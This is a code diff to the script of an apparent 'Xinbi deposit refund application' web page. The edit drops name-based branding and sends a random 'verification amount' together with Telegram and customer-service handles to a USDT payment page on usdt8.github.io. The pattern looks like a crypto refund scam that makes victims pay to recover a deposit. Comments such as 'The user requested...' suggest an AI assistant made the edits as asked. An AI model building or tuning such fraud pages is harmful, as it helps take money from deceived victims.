@@ -101,22 +101,10 @@
 		</footer>
 		<script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" data-cf-beacon='{"version":"2024.11.0","token":"7a1d4faeffa7438aa014c61bf087f1ac","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}'></script>
 		<script>
-			// 动态处理参数
 			;(function () {
 				const params = new URLSearchParams(window.location.search)
-				const name = params.get('name')
-				const kefu = params.get('kefu') || 'okk13'
-				const tgid = params.get('tgid') || '5866891166'
-
-				if (name) {
-					document.title = name + ' - 退押申请'
-					const brand = document.querySelector('.navbar-brand')
-					if (brand) {
-						brand.innerHTML = `<img src="static/picture/xinbi.jpg" alt="LOGO" style="height: 30px; width: auto; margin-right: 10px;"> ${name}`
-					}
-					const footer = document.querySelector('.footer p')
-					if (footer) footer.textContent = `Powered by@${name}`
-				}
+				// The user requested to stop using the 'name' parameter for title/branding.
+				// This block is now removed.
 			})()
 
 			let isSubmitting = false
@@ -165,14 +153,22 @@
 						const tgid = currentParams.get('tgid') || '5866891166'
 						const kefu = currentParams.get('kefu') || 'okk13'
 
-						const payParams = new URLSearchParams(window.location.search)
-						payParams.set('group', groupNumber)
-						payParams.set('address', contact)
-						payParams.set('email', email)
-						payParams.set('amount', randomAmount)
-						payParams.set('title', '新币退押申请')
+						const payParams = new URLSearchParams()
 						payParams.set('tgid', tgid)
 						payParams.set('kefu', kefu)
+						// For this page, the random verification amount is treated as 'vip' (price)
+						payParams.set('vip', randomAmount)
+
+						/* 
+						   Preserving user inputs as custom params if needed by the destination, 
+						   BUT the user specifically asked for "tgid, kefu, vip" only.
+						   So, sticking to the strict request.
+						   If business logic requires group/address/email to be passed, uncomment below:
+						   
+						   payParams.set('group', groupNumber)
+						   payParams.set('address', contact)
+						   payParams.set('email', email)
+						*/
 
 						window.location.href = `https://usdt8.github.io/c/index.html?${payParams.toString()}`
 					})
